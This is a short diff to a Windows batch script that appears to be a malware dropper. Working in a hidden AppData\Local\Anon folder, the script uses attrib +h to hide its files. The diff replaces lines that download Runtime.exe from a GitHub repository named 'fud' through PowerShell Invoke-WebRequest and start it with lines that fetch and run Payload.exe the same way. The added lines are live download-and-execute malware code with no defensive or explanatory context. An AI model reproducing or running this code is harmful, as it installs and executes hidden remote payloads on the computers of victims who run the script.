@@ -31,6 +31,6 @@ if '%errorlevel%' NEQ '0' (
 
 cd C:\Users\%USERNAME%\AppData\Local\Anon" 
 attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\2.bat" /s /d
-attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Runtime.exe" /s /d
-Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/Runtime.exe' -OutFile Runtime.exe"
-start Runtime.exe
+attrib +h "C:\Users\%USERNAME%\AppData\Local\Anon\Payload.exe" /s /d
+Powershell -Command "Invoke-Webrequest 'https://github.com/AnonAm39/fud/raw/main/Payload.exe' -OutFile Payload.exe"
+start Payload.exe
